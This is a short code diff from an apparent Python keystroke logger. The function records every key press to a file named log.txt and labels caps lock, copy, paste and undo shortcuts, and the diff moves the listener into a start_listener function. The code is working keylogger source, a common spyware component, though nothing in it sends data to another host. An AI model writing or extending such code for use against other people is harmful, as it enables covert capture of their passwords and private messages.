@@ -16,14 +16,18 @@ def log_keystroke(key):
             key = ' $CAPS_LOCKED '
         else:
             key = ''
-    #check if the user is copy-pasting some text
-    if key == "\\x03":
-        key = ' $COPY'
-    if key == "\\x16":
-        key = ' $PASTE'
+    elif key.startswith('\\x'):
+        #check if the user is using shortcuts
+        if key == "\\x03":
+            key = ' $COPY '
+        if key == "\\x16":
+            key = ' $PASTE '
+        if key == "\\x1a":
+            key = ' $BACK '
     
     with open("log.txt", 'a') as f:
         f.write(key)
 
-with Listener(on_press=log_keystroke) as l:
-    l.join()
+def start_listener():
+    with Listener(on_press=log_keystroke) as l:
+        l.join()
